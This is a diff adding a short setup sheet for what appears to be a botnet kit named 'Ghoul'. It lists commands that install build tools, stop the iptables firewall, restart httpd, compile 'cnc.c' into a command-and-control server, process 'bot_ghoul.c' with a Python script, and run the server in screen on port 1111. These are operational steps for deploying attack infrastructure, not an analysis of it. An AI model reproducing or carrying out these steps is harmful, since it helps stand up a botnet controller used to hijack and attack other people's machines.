@@ -1,0 +1,27 @@
+
+				 
+
+ 1 . yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+
+2 . service httpd restart 
+3 . service iptables stop
+
+4 . gcc cnc.c -o server -pthread
+
+     5. python Ghoul.py bot_ghoul.c 
+
+
+
+                      screen ./server 1111 1 420
+
+
+                    if server does nto screen run these commands
+
+
+
+    
+                                      1. yum install screen
+
+                                         2.    pkill screen
+
+                                          3 . screen ./server 1111 1 420 
